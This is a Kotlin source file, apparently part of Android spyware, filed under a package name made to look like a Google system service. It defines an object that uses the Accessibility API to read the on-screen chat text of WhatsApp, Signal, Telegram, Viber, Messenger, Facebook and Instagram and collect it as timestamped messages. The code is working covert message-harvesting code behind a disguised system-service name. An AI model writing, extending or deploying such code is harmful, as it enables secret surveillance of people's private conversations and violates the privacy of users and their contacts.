package com.google.android.systemservice.utils

import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log

/**
 * Advanced scraper for extracting chat messages from social media apps via Accessibility.
 * Supports: WhatsApp, Viber, Telegram, Messenger, Signal, Instagram, Facebook.
 */
object SocialMediaScraper {
    private const val TAG = "SocialMediaScraper"

    private val TARGET_PACKAGES = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.viber.voip" to "Viber",
        "org.telegram.messenger" to "Telegram",
        "com.facebook.orca" to "Messenger",
        "com.facebook.katana" to "Facebook",
        "com.instagram.android" to "Instagram",
        "org.thoughtcrime.securesms" to "Signal"
    )

    fun isTargetApp(packageName: String): Boolean = TARGET_PACKAGES.containsKey(packageName)

    fun scrapeMessages(rootNode: AccessibilityNodeInfo?, packageName: String): List<ScrapedMessage> {
        val messages = mutableListOf<ScrapedMessage>()
        if (rootNode == null) return messages

        val appName = TARGET_PACKAGES[packageName] ?: "Unknown"
        
        // Recursively find text nodes that look like messages
        findTextNodes(rootNode, messages, appName)
        
        return messages.distinctBy { it.text + it.sender }
    }

    private fun findTextNodes(node: AccessibilityNodeInfo, messages: MutableList<ScrapedMessage>, appName: String) {
        if (node.text != null && node.text.toString().isNotBlank()) {
            val text = node.text.toString()
            
            // Heuristic: ignore short system strings or UI labels
            if (text.length > 1) {
                // Try to identify sender by looking at parent/sibling nodes (simplified for now)
                val sender = "Unknown" // Advanced sender detection logic can be added here
                messages.add(ScrapedMessage(appName, sender, text, System.currentTimeMillis()))
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                findTextNodes(child, messages, appName)
                child.recycle()
            }
        }
    }

    data class ScrapedMessage(
        val app: String,
        val sender: String,
        val text: String,
        val timestamp: Long
    )
}
